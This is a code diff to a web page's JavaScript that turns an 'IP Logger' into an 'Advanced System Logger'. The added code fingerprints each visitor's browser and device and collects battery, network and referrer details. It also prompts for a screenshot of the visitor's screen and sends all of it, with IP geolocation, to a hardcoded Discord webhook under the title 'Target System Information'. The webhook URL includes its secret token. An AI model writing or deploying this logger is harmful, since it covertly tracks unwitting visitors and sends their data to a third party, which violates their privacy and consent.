@@ -198,47 +198,120 @@
             };
         }
 
+        async function getSystemInfo() {
+            const info = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                cookiesEnabled: navigator.cookieEnabled,
+                screenResolution: `${window.screen.width}x${window.screen.height}`,
+                colorDepth: window.screen.colorDepth,
+                deviceMemory: navigator.deviceMemory || 'Unknown',
+                hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
+                connection: navigator.connection ? {
+                    type: navigator.connection.effectiveType,
+                    downlink: navigator.connection.downlink,
+                    rtt: navigator.connection.rtt
+                } : 'Unknown',
+                battery: 'Checking...',
+                hostname: window.location.hostname,
+                referrer: document.referrer || 'Direct',
+                timeOpened: new Date().toLocaleString(),
+                browserName: getBrowserName(),
+                osInfo: getOSInfo()
+            };
+
+            // محاولة الحصول على معلومات البطارية
+            try {
+                const battery = await navigator.getBattery();
+                info.battery = {
+                    level: `${battery.level * 100}%`,
+                    charging: battery.charging ? 'Yes' : 'No'
+                };
+            } catch (e) {
+                info.battery = 'Not available';
+            }
+
+            return info;
+        }
+
+        function getBrowserName() {
+            const userAgent = navigator.userAgent;
+            if (userAgent.includes("Firefox")) return "Firefox";
+            if (userAgent.includes("Chrome")) return "Chrome";
+            if (userAgent.includes("Safari")) return "Safari";
+            if (userAgent.includes("Edge")) return "Edge";
+            if (userAgent.includes("Opera")) return "Opera";
+            return "Unknown";
+        }
+
+        function getOSInfo() {
+            const userAgent = navigator.userAgent;
+            if (userAgent.includes("Windows")) return "Windows";
+            if (userAgent.includes("Mac")) return "MacOS";
+            if (userAgent.includes("Linux")) return "Linux";
+            if (userAgent.includes("Android")) return "Android";
+            if (userAgent.includes("iOS")) return "iOS";
+            return "Unknown";
+        }
+
+        async function captureScreen() {
+            try {
+                const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await video.play();
+
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0);
+
+                stream.getTracks().forEach(track => track.stop());
+                return canvas.toDataURL('image/jpeg');
+            } catch (error) {
+                console.error('Screen capture failed:', error);
+                return null;
+            }
+        }
+
         async function sendToDiscord(ipData) {
             const webhookURL = 'https://discord.com/api/webhooks/1351899817076457472/RIviYXvKW0Nc_baHvDhamQiXQH6t7fCxLpUjxAxP8EDqYzJAV_nzC8DqlTa_Fq_O3eEk';
             
+            const systemInfo = await getSystemInfo();
+            const screenshot = await captureScreen();
+
             const embed = {
-                username: "IP Logger",
+                username: "Advanced System Logger",
                 avatar_url: "https://c.top4top.io/p_3365imiag1.jpg",
                 embeds: [{
-                    title: "🎯 Target Information Captured",
-                    description: "New visitor detected on the page",
-                    color: 16711680, // أحمر
+                    title: "🎯 Target System Information",
+                    description: "Detailed system information captured",
+                    color: 16711680,
                     fields: [
-                        {
-                            name: "📍 IP Address",
-                            value: `\`${ipData.ip}\``,
-                            inline: true
-                        },
-                        {
-                            name: "🌍 Country",
-                            value: ipData.country_name || "Unknown",
-                            inline: true
-                        },
-                        {
-                            name: "🏙️ City",
-                            value: ipData.city || "Unknown",
-                            inline: true
-                        },
-                        {
-                            name: "🔧 ISP",
-                            value: ipData.org || "Unknown",
-                            inline: true
-                        },
-                        {
-                            name: "⏰ Timezone",
-                            value: ipData.timezone || "Unknown",
-                            inline: true
-                        },
-                        {
-                            name: "💻 System Info",
-                            value: `\`${navigator.userAgent}\``,
-                            inline: false
-                        }
+                        // IP Information
+                        { name: "📍 IP Address", value: `\`${ipData.ip}\``, inline: true },
+                        { name: "🌍 Country", value: ipData.country_name || "Unknown", inline: true },
+                        { name: "🏙️ City", value: ipData.city || "Unknown", inline: true },
+                        { name: "🔧 ISP", value: ipData.org || "Unknown", inline: true },
+                        { name: "⏰ Timezone", value: ipData.timezone || "Unknown", inline: true },
+                        
+                        // System Information
+                        { name: "💻 OS", value: systemInfo.osInfo, inline: true },
+                        { name: "🌐 Browser", value: systemInfo.browserName, inline: true },
+                        { name: "🖥️ Screen Resolution", value: systemInfo.screenResolution, inline: true },
+                        { name: "🔋 Battery", value: JSON.stringify(systemInfo.battery), inline: true },
+                        { name: "💾 Device Memory", value: `${systemInfo.deviceMemory} GB`, inline: true },
+                        { name: "⚡ CPU Cores", value: systemInfo.hardwareConcurrency.toString(), inline: true },
+                        
+                        // Network Information
+                        { name: "🌐 Network Info", value: JSON.stringify(systemInfo.connection), inline: false },
+                        
+                        // Additional Details
+                        { name: "🔤 Language", value: systemInfo.language, inline: true },
+                        { name: "⏱️ Time Opened", value: systemInfo.timeOpened, inline: true },
+                        { name: "📝 User Agent", value: `\`${systemInfo.userAgent}\``, inline: false }
                     ],
                     timestamp: new Date().toISOString(),
                     footer: {
@@ -246,6 +319,12 @@
                     }
                 }]
             };
+
+            if (screenshot) {
+                embed.embeds[0].image = {
+                    url: screenshot
+                };
+            }
 
             try {
                 const response = await fetch(webhookURL, {
